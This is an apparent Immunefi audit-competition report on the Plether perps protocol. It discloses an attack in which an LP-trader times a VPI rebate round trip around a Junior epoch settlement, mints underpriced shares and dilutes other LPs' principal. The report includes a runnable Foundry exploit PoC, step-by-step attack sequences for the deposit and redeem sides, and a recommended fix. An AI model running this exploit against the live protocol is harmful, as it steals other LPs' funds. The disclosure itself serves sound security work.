# \#97863 [SC-Critical] An LP who is also a trader can mint Junior shares at a self-depressed NAV by round-tripping a VPI rebate around an LP epoch settlement, stealing principal from existing Junior LPs; the documented anti-sandwich clamp does not cover this path

**Submitted on Nov 3rd 2026 at 16:51:35 UTC by @enowk for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97863
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Plether's liquidity-provider (LP) share price is struck, at each hourly epoch settlement, from the pool's **physical cash** balance. When a trader opens a position that *reduces* the book's skew, the protocol pays that trader a "VPI" rebate out of pool cash — the pool's cash, and therefore the Junior LP net asset value (NAV), drop immediately by the rebate amount. The matching reserve that guarantees the rebate is paid back when the position closes is deliberately left out of NAV.

A single actor who is both a Junior LP and a trader can exploit this. Around the settlement that activates their own matured Junior deposit, they open a skew-reducing position (depressing NAV), let their deposit activate at that depressed price (minting extra shares), then close the position — the protocol's lifetime "VPI clamp" forces them to pay the rebate back, so NAV recovers — and later redeem the enlarged stake at the recovered price. The position round-trip nets ≈0 for the trader (only the execution fee is paid), so the NAV swing is cost-free and fully self-reversing. The extra shares minted during the self-created dip are pure dilution of the other Junior LPs: their principal is transferred to the attacker.

The protocol explicitly defends against "VPI LP sandwich attacks" with the lifetime clamp, but that clamp only operates inside the trader's own cash settlement — it never touches LP share pricing, so this channel is left open.

## Vulnerability Details

**Two facts the attack combines.**

1. **LP NAV = pool physical cash.** Entry and exit share prices come from a reconcile snapshot whose assets are exactly `pool.totalAssets()`:
   - `CfdEngineProtocolLens.getHousePoolInputSnapshot` sets `physicalAssets = engineContract.pool().totalAssets()` ([CfdEngineProtocolLens.sol#L60-L72](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol?plain=1#L60-L72)).
   - `HousePoolAccountingLib.buildReconcileSnapshot` uses it directly as terminal assets ([HousePoolAccountingLib.sol#L60-L78](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol?plain=1#L60-L78)).
   - The Junior deposit activation price is `juniorPrincipal / juniorShareSupply` fixed at settlement ([HousePool.sol#L910-L916](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol?plain=1#L910-L916)); the redemption price is symmetric ([HousePool.sol#L835-L841](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol?plain=1#L835-L841)).

2. **A skew-reducing open pays a rebate out of pool cash, and the offsetting reserve is excluded from NAV.** The planner books `poolRebatePayoutAssets` when the trade cost is negative ([CfdEnginePlanLib.sol#L333](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol?plain=1#L333)); that cash leaves the pool, dropping `pool.totalAssets()`. The reserve that guarantees the rebate's return is, by the project's own statement, kept out of NAV:
   > "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV" — [SECURITY.md#L872](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L872).

   So while the skew-reducing position is open, Junior NAV is understated by the rebate `R`, even though `R` is contractually guaranteed to come back.

**Why the documented defense does not stop it.** The protocol's stated protection against VPI LP sandwiches is the lifetime clamp: *"the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips"* ([SECURITY.md#L1443](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1443)), with the implementing comment naming "LP sandwich attacks" explicitly. But the clamp acts only on the **trader's own cash settlement** — it clamps `vpiDeltaAssets`, which then flows only into `netSettlementAssets` ([CloseAccountingLib.sol#L108-L125](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol?plain=1#L108-L125)). It never touches the physical-cash NAV that prices LP shares. So it zeroes the *trader leg* (open `+R`, close `−R`) while leaving open the *LP-mint-timing leg*, which is where the value is extracted.

**Why this is in scope despite the documentation.** The two documentation statements this report cites are design notes about a *mechanism*, not a disclosure of *this attack*:

- `SECURITY.md:872` ("neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV") is a *conservative* choice: it stops the protocol from crediting itself gains it has not realized. It is written to prevent *over*-stating NAV. It does not state, or contemplate, that an actor can deliberately *under*-state NAV at will — and reverse it seconds later at no cost — to mint LP shares at a manufactured price. The project applies the same exclusion to carry and spells out the acceptable consequence for carry in `ACCOUNTING_SPEC.md:737-740` ("a collection-time ownership policy … timing can transfer part of old *revenue* to a new LP"). That blessing is explicitly about sharing *real earned revenue*. This attack transfers *principal* through a swing that nets to zero and has no underlying economic event, so that blessing does not cover it.
- `SECURITY.md:1443` and the clamp comment show the team **did** consider "VPI LP sandwich attacks" and shipped a defense they believed closed them. The finding is precisely that the defense is incomplete: it closes the trader-cash channel but not the LP-share-minting channel. "The project documented an intent to prevent attack class X, and X still works through a channel the fix does not reach" is a valid vulnerability, not an accepted limitation. A fix exists (see Recommendation) and does not change any intended trader-side economics.

In short: the NAV treatment is intended; being able to weaponize it for a cost-free, self-reversing LP-share mispricing that steals principal is not, and the protocol's own anti-sandwich control is evidence the team intended to prevent it.

**Attack sequence (deposit side).**

1. The order book carries directional skew — net long or net short open interest. This arises naturally whenever traders lean one way; the attacker does not need to manufacture it (and manufacturing it themselves would pay the rebate the other way). A position that *reduces* the standing skew earns a VPI rebate, and the larger the skew the larger the rebate.
2. The attacker `A` requests a Junior deposit of `D` in the ordinary async flow and waits, holding **no** position, until it matures (next hourly boundary).
3. At maturity `A` opens a skew-reducing position of size `S`. Pool cash and Junior NAV drop by `R = 0.01 · S² / (2 · D_pool)`.
4. `A` (order execution and LP settlement are permissionless — keepers are untrusted) calls `settleLpEpoch`. Its deposit activates at the depressed NAV, minting more shares than fair.
5. `A` closes the position; the lifetime clamp forces it to repay `R`, so NAV recovers.
6. `A` claims the shares, waits the one-hour cooldown, redeems the enlarged stake at the recovered NAV, and claims.

Steps 3–5 can run in consecutive blocks (see the minimal-hold test), so the attacker's directional price exposure is only a few seconds. The redeem side is the mirror: inflate NAV with a skew-*increasing* open before a redemption settles, fund the redemption at the inflated price, then recover via the rebate.

## Impact Details

Direct, repeatable transfer of **principal** from existing Junior LPs to the attacker. The only cost is the execution fee on the attacker's own position (partly recovered, since the attacker can be its own keeper). It is not a loss of mere unclaimed yield — it diminishes the share value of LPs' deposited capital.

The per-event size is `≈ φ · R − 0.0008 · S`, where `R = 0.01 · S²/(2·D_pool)` and `φ` is the fraction of the pool the attacker's deposit/redemption represents. All figures below are attacker gain and victim loss **relative to an identical baseline run** in which the attacker only deposits/redeems with no position:

| Scenario | Pool depth | Skew `S` | Rebate `R` | Attacker gain vs baseline | Victim Junior loss vs baseline | Source |
|----------|-----------|----------|-----------|---------------------------|--------------------------------|--------|
| Deposit-side | ~2M | 790k (~40%) | 1,557 USDG | **+613.41 USDG** | **−1,245.61 USDG** | PoC — executed |
| Redeem-side | ~5M | 2M (~40%) | 3,332 USDG | **+1,055.90 USDG** | **−1,865.26 USDG** | PoC — executed |
| Deposit-side | 50M | 20M (40%) | ~40,000 USDG | **~+16,000 USDG** | **~−32,000 to −38,000 USDG** | closed-form extrapolation (not executed) |

The 50M row is an extrapolation from the closed-form model above, **not** a measured run; the model reproduces the executed ~2M case's victim loss to within 0.03% (`4M·1557.48/(1M+4M) = 1245.98` vs measured `1245.61`), so the extrapolation rests on a validated formula. The attack is repeatable every hour while skew persists; break-even is around 16–20% skew.

Note on value flow: at the ~2M scale the attacker nets ≈ +613 USDG while existing Junior LPs lose ≈ −1,246 USDG; the ≈ 632 USDG difference is the execution fees the attacker pays on the two legs (which accrue to the pool/keeper). So the attacker's realized theft per event is the +613 figure, and part of the LPs' loss is value burned as fees rather than captured by the attacker.

## Severity assessment

The impact *class* is theft of LP **principal**, which maps to the program's Critical "direct theft of user funds, at-rest" tier. We nonetheless assess realized severity as **High**, and set out the full case so the program can make the final call:

- **Why not Critical:** the preconditions are non-trivial. It needs standing directional skew (the attacker cannot cheaply manufacture it — doing so pays the rebate the other way) and meaningful capital deployed as a Junior LP plus trading margin (at the 50M-depth figures, on the order of a 40M Junior stake plus ~20M margin). Per event the extraction is a few basis points of the attacker's stake.
- **Why not Medium:** it is a direct, repeatable transfer of other LPs' principal, net-positive to the attacker after their own fees, with negligible price risk (the directional leg is held for ~2–3 blocks — see the minimal-hold test). It scales super-linearly with pool depth (`R ∝ S²/D_pool`), reaching tens of thousands of USDG per hour at production depth, and can be repeated each epoch while skew persists. That is materially more than griefing or a trivial loss.

We defer the final Critical/High/Medium determination to the program.

## Recommendation

Price LP deposits and redemptions on a NAV that credits the VPI rebate reserve back as the pool receivable it is — symmetric to how the lifetime clamp already treats it on the trader side — so a reserve-backed, guaranteed-to-return rebate does not depress the settlement price while the position is open. Equivalent fixes: exclude the just-paid rebate from the epoch settlement NAV, or extend the lifetime-clamp invariant to the LP-share-pricing path. Any of these closes the LP-mint-timing channel without changing trader-side VPI economics.


## Proof of Concept

## Proof of Concept

A runnable Foundry test is included. It uses the repository's own fixture (`BasePerpTest`) at the pinned commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, with **no fork and no RPC**, mocks only Pyth (the repo's `MockPyth`) and USDG, and modifies no in-scope contract. The attack uses public, permissionless entry points only (`TrancheVault.requestDeposit/claimDeposit/requestRedeem/claimRedeem`, `OrderRouter.commitOrder`/`executeOrder`, `OrderRouter.settleLpEpoch`). Price is held constant at 1.0 throughout, so there is no price PnL — the measured transfer is purely the NAV-timing dilution. The test overrides `_riskParams()` with the release values in [`DEPLOYMENT.md`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L128-L140) (maintenance margin 10 bps, initial margin 20 bps, frozen margin 300 bps, exec fee 4 bps, VPI 0.01e18, bounty 10 bps / 1 USDG min) and the release Senior limits (40M USDG / 80%).

Setup and run:
```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the file below as packages/perps/test/poc/VpiLpSandwichPoC.t.sol
FOUNDRY_TEST=test/poc forge test --root packages/perps --match-path test/poc/VpiLpSandwichPoC.t.sol -vv
```
(`FOUNDRY_TEST=test/poc` compiles only this test and its imports instead of the repo's whole test suite.)

Expected output (all three pass):
```
[PASS] test_vpiLpSandwich_dilutesJuniorLPs()
  attacker gain vs baseline: 613412380       (+613.41 USDG)
  victim junior loss vs baseline: 1245612379 (−1245.61 USDG)
[PASS] test_vpiLpSandwich_redeemSide()
  attacker gain vs baseline: 1055903166       (+1055.90 USDG)
  victim junior loss vs baseline: 1865256146  (−1865.26 USDG)
[PASS] test_vpiLpSandwich_minimalHold()
  attacker gain vs baseline: 613699423
  victim junior loss vs baseline: 1245899420
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

What the assertions prove:
- **`test_vpiLpSandwich_dilutesJuniorLPs`** (deposit side): against an identical baseline where the attacker only deposits and redeems (no position), the VPI round-trip makes the attacker strictly better off and net-positive after fees, while the pre-existing Junior LP's value strictly decreases. The victim loss (1245.61) matches the pure-dilution formula `D·R/(E+D) = 4M·1557.48/(1M+4M) = 1245.98` to within 0.03%, confirming the cause is the NAV-timing dilution (not carry, ~4 USDG over the hold, and not price, which is constant).
- **`test_vpiLpSandwich_redeemSide`** (redeem side): the mirror — the attacker inflates NAV with a skew-increasing open before its redemption settles, funds the redemption at the inflated price, then closes. Attacker +1055.90 USDG, victim Junior −1865.26 USDG vs baseline. Baseline and attack use the same settlement route.
- **`test_vpiLpSandwich_minimalHold`**: the attacker waits for maturity while flat, then opens → settles → closes in consecutive blocks. The result is essentially identical to the deposit-side test, so the directional exposure is only ~2–3 execution blocks (seconds on Arbitrum) — the price risk is negligible and need not be hedged.

`packages/perps/test/poc/VpiLpSandwichPoC.t.sol`:
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice VPI rebate round-trip LP-epoch-settlement sandwich — minimal PoC. A VPI rebate round-trip timed around a
///         Junior LP epoch settlement temporarily depresses physical-cash NAV (the offsetting rebate reserve is
///         excluded from NAV), so the attacker's matured deposit activates at a cheap price; closing restores NAV via
///         the lifetime clamp, and the enlarged stake is redeemed — diluting existing Junior LPs.
///         Attack uses public entry points only: TrancheVault.requestDeposit/claimDeposit/requestRedeem/claimRedeem,
///         OrderRouter.commitOrder (scalar adapter -> production V3 commit), OrderRouter.executeOrder,
///         OrderRouter.settleLpEpoch(bytes[]). Mocks: Pyth (MockPyth) and USDG only. No in-scope contract modified.
///         Price is constant at 1.0 throughout, so there is no price PnL — the transfer is pure NAV-timing dilution.
contract VpiLpSandwichTest is BasePerpTest {
    address internal H = address(0x4011E57); // honest trader creating skew
    address internal A = address(0xA77AC); // attacker: junior LP + trader + keeper
    address internal K = address(0xBEEF); // neutral keeper

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000); // DEPLOYMENT.md release Senior limits
        vm.deal(A, 1 ether);
        vm.deal(K, 1 ether);
    }

    function _pyth(uint256 p) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 t = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), SafeCast.toInt64(SafeCast.toInt256(p)), 0, int32(-8), t, t - 1);
        data = new bytes[](1);
        data[0] = abi.encode(p);
    }

    function _fundCh(address a, uint256 amt) internal {
        settlementToken.mint(a, amt);
        vm.startPrank(a);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(a, amt);
        vm.stopPrank();
    }

    function _exec(address account, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose) internal {
        vm.prank(account);
        router.commitOrder(side, size, margin, 0, isClose);
        uint64 head = router.nextExecuteId();
        bytes[] memory data = _pyth(1e8);
        vm.prank(K);
        router.executeOrder(head, data);
        assertTrue(router.nextExecuteId() != head, "order left pending");
    }

    function _settle(address caller) internal {
        bytes[] memory data = _pyth(1e8);
        vm.prank(caller);
        router.settleLpEpoch{value: 1}(data);
    }

    function _wealth(address a) internal view returns (uint256) {
        return settlementToken.balanceOf(a) + clearinghouse.balanceAssets(a);
    }

    function _juniorValue(address a) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(a));
    }

    struct Outcome {
        int256 attackerProfit;
        uint256 victimJuniorValue;
        uint256 rebateObserved;
        uint256 sharesMinted;
    }

    /// @dev `attack` toggles ONLY A's skew-reducing short round trip around the junior deposit activation;
    ///      everything else is identical, so the delta isolates the VPI NAV-timing effect.
    ///      `minimalHold` opens the short AFTER the deposit has matured (A waits flat), so A's directional
    ///      exposure is only the ~2-3 execution blocks spanning open -> settle -> close.
    function _run(bool attack, bool minimalHold, uint256 depositAssets, uint256 skewSize)
        internal
        returns (Outcome memory o)
    {
        uint256 hourStart = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
        vm.warp(hourStart + 600);
        _fundCh(H, 100_000e6);
        _fundCh(K, 1_000e6);
        _exec(H, CfdTypes.Side.LONG, skewSize, 50_000e6, false); // honest skew near the 40% cap; H pays VPI to LPs

        _fundCh(A, 50_000e6);
        settlementToken.mint(A, depositAssets);
        uint256 w0 = _wealth(A);
        vm.startPrank(A);
        settlementToken.approve(address(juniorVault), depositAssets);
        uint256 depId = juniorVault.requestDeposit(depositAssets, A, A);
        vm.stopPrank();

        if (minimalHold) {
            vm.warp(juniorVault.depositEpochStart(depId) + 30); // wait for maturity while FLAT
        }

        uint256 poolBefore = pool.totalAssets();
        if (attack) {
            _exec(A, CfdTypes.Side.SHORT, skewSize, 20_000e6, false); // reduce skew -> pool pays rebate -> NAV drops
        }
        o.rebateObserved = poolBefore > pool.totalAssets() ? poolBefore - pool.totalAssets() : 0;

        if (!minimalHold) {
            vm.warp(juniorVault.depositEpochStart(depId) + 30);
        }
        _settle(A); // A (permissionless keeper) activates its deposit at the depressed NAV
        assertTrue(juniorVault.claimableDepositRequest(depId, A) == depositAssets, "deposit activated");

        if (attack) {
            _exec(A, CfdTypes.Side.SHORT, skewSize, 0, true); // close -> clamp returns the rebate -> NAV recovers
        }

        vm.prank(A);
        o.sharesMinted = juniorVault.claimDeposit(depId, depositAssets, A, A);

        vm.warp(vm.getBlockTimestamp() + 1 hours + 1); // cooldown
        uint256 shares = juniorVault.balanceOf(A);
        vm.prank(A);
        uint256 redId = juniorVault.requestRedeem(shares, A, A);
        vm.warp(redId * 1 hours + 30);
        _settle(K);
        uint256 claimable = juniorVault.claimableRedeemRequest(redId, A);
        assertEq(claimable, shares, "redemption fully funded");
        vm.prank(A);
        juniorVault.claimRedeem(redId, claimable, A, A);

        o.attackerProfit = int256(_wealth(A)) - int256(w0);
        o.victimJuniorValue = _juniorValue(address(this));
    }

    function _report(string memory tag, Outcome memory o) internal {
        emit log_string(tag);
        emit log_named_int("  attacker profit (USDG atoms)", o.attackerProfit);
        emit log_named_uint("  victim junior value", o.victimJuniorValue);
        emit log_named_uint("  pool NAV drop at A's open (rebate)", o.rebateObserved);
        emit log_named_uint("  junior shares minted to A", o.sharesMinted);
    }

    /// @notice Primary: attacker nets a profit and an existing Junior LP loses value, at constant price.
    function test_vpiLpSandwich_dilutesJuniorLPs() public {
        uint256 d = 4_000_000e6;
        uint256 s = 790_000e18;
        uint256 snap = vm.snapshotState();
        Outcome memory base = _run(false, false, d, s);
        vm.revertToState(snap);
        Outcome memory atk = _run(true, false, d, s);
        _report("baseline (A deposits, no trade)", base);
        _report("attack (VPI round trip around activation)", atk);
        emit log_named_int("  attacker gain vs baseline", atk.attackerProfit - base.attackerProfit);
        emit log_named_int(
            "  victim junior loss vs baseline", int256(base.victimJuniorValue) - int256(atk.victimJuniorValue)
        );
        assertGt(atk.attackerProfit, base.attackerProfit, "attack strictly better than baseline");
        assertGt(atk.attackerProfit, 0, "attacker net profit after all fees");
        assertLt(atk.victimJuniorValue, base.victimJuniorValue, "existing junior LP loses value");
    }

    /// @dev Redeem-side mirror: an existing Junior holder inflates NAV with a skew-increasing open (VPI paid INTO
    ///      the pool) right before its redemption settles, funds the redemption at the inflated price, then closes
    ///      (clamp normalizes NAV). Baseline and attack use the same settlement route for an apples-to-apples delta.
    function _runRedeem(bool attack, uint256 attackerJunior, uint256 skewSize) internal returns (Outcome memory o) {
        uint256 hourStart = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
        vm.warp(hourStart + 600);
        _fundCh(K, 1_000e6);
        _fundCh(A, 100_000e6);
        settlementToken.mint(A, attackerJunior);
        vm.startPrank(A);
        settlementToken.approve(address(juniorVault), attackerJunior);
        uint256 depId = juniorVault.requestDeposit(attackerJunior, A, A);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(depId) + 30);
        _settle(K);
        vm.prank(A);
        juniorVault.claimDeposit(depId, attackerJunior, A, A);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);

        uint256 w0 = _wealth(A) + juniorVault.convertToAssets(juniorVault.balanceOf(A));
        uint256 shares = juniorVault.balanceOf(A);
        vm.prank(A);
        uint256 redId = juniorVault.requestRedeem(shares, A, A);

        uint256 poolBefore = pool.totalAssets();
        if (attack) {
            _exec(A, CfdTypes.Side.LONG, skewSize, 50_000e6, false); // increase skew -> pool receives VPI -> NAV up
        }
        o.rebateObserved = pool.totalAssets() > poolBefore ? pool.totalAssets() - poolBefore : 0;
        vm.warp(redId * 1 hours + 30);
        _settle(attack ? A : K); // fund the redemption at the (inflated) NAV
        if (attack) {
            _exec(A, CfdTypes.Side.LONG, skewSize, 0, true); // close -> clamp normalizes NAV
        }
        for (uint256 i; i < 4 && juniorVault.pendingRedeemRequest(redId, A) != 0; ++i) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            _settle(K);
        }
        uint256 claimable = juniorVault.claimableRedeemRequest(redId, A);
        vm.prank(A);
        juniorVault.claimRedeem(redId, claimable, A, A);
        o.attackerProfit = int256(_wealth(A) + juniorVault.convertToAssets(juniorVault.balanceOf(A))) - int256(w0);
        o.victimJuniorValue = _juniorValue(address(this));
    }

    function test_vpiLpSandwich_redeemSide() public {
        uint256 snap = vm.snapshotState();
        Outcome memory base = _runRedeem(false, 4_000_000e6, 2_000_000e18);
        vm.revertToState(snap);
        Outcome memory atk = _runRedeem(true, 4_000_000e6, 2_000_000e18);
        _report("redeem baseline", base);
        _report("redeem attack", atk);
        emit log_named_int("  attacker gain vs baseline", atk.attackerProfit - base.attackerProfit);
        emit log_named_int(
            "  victim junior loss vs baseline", int256(base.victimJuniorValue) - int256(atk.victimJuniorValue)
        );
        assertGt(atk.attackerProfit, base.attackerProfit, "redeem attack strictly better than baseline");
        assertLt(atk.victimJuniorValue, base.victimJuniorValue, "existing junior LP loses value");
    }

    /// @notice Payability: identical outcome when A holds the directional leg for only ~2-3 blocks (opens after
    ///         maturity, closes right after settlement), so realistic price exposure during the hold is negligible.
    function test_vpiLpSandwich_minimalHold() public {
        uint256 d = 4_000_000e6;
        uint256 s = 790_000e18;
        uint256 snap = vm.snapshotState();
        Outcome memory base = _run(false, true, d, s);
        vm.revertToState(snap);
        Outcome memory atk = _run(true, true, d, s);
        _report("min-hold baseline", base);
        _report("min-hold attack (~2-block exposure)", atk);
        emit log_named_int("  attacker gain vs baseline", atk.attackerProfit - base.attackerProfit);
        emit log_named_int(
            "  victim junior loss vs baseline", int256(base.victimJuniorValue) - int256(atk.victimJuniorValue)
        );
        assertGt(atk.attackerProfit, base.attackerProfit, "attack strictly better with ~2-block exposure");
        assertGt(atk.attackerProfit, 0, "attacker net profit after all fees");
        assertLt(atk.victimJuniorValue, base.victimJuniorValue, "existing junior LP loses value");
    }
}
```

